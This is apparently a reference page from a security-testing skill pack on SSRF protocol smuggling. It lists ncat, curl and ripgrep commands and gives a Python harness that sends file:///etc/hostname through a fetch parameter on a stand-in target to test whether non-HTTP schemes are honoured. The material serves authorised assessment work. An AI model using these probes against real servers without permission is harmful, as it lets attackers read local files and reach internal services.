# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`ssrf-protocol-smuggling`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `ncat` | `ncat -lvk <assessor-port>` | Listen for bytes delivered by a gopher or dict probe to prove the scheme acted | Linux, macOS, Windows |
| `curl` | `curl -sS 'https://target.example/fetch?url=file:///etc/hostname'` | Test whether the connector honours the file scheme with a benign path | Cross-platform |
| `ripgrep` | `rg -n -e urlopen -e "new URL" -e HttpURLConnection -e "requests.get" --type py --type java` | Locate connectors that may dispatch on scheme without an allowlist | Cross-platform |

## Minimal Script Shape

A scheme-support harness: it requests the same endpoint with an http control and a file scheme, reporting that the connector honours non-HTTP schemes when the file probe returns content.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/fetch"

def via(scheme_url):
    url = BASE + "?" + urllib.parse.urlencode({"url": scheme_url})
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            return r.status, len(r.read())
    except urllib.error.HTTPError as exc:
        return exc.code, 0

http_ctrl = via("https://example.org/")
file_probe = via("file:///etc/hostname")
print({"http_control": http_ctrl, "file_scheme": file_probe,
       "scheme_honoured": file_probe[1] > 0})
```
